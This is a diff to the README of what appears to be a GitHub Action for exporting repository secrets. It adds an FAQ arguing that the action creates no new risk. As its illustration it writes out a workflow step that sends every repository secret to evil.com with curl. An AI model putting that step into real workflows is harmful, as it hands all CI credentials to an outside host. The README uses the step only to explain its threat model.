@@ -133,6 +133,17 @@ Or delete via the GitHub UI: Actions → Workflow run → Artifacts section → 
 
 ## Troubleshooting
 
+### "Doesn't this action make my repo unsafe?"
+
+No - anyone with branch creation access can already steal secrets without this action:
+
+```yaml
+# Any workflow in any branch can do this:
+- run: curl https://evil.com -d "${{ toJSON(secrets) }}"
+```
+
+This export action doesn't create new risk. It just makes intentional secret export easier. If you trust someone to create branches, you're already trusting them with secrets.
+
 ### "no identity matched any of the recipients" or "Failed to decrypt"
 
 The private key you're using doesn't match the public key used for encryption.
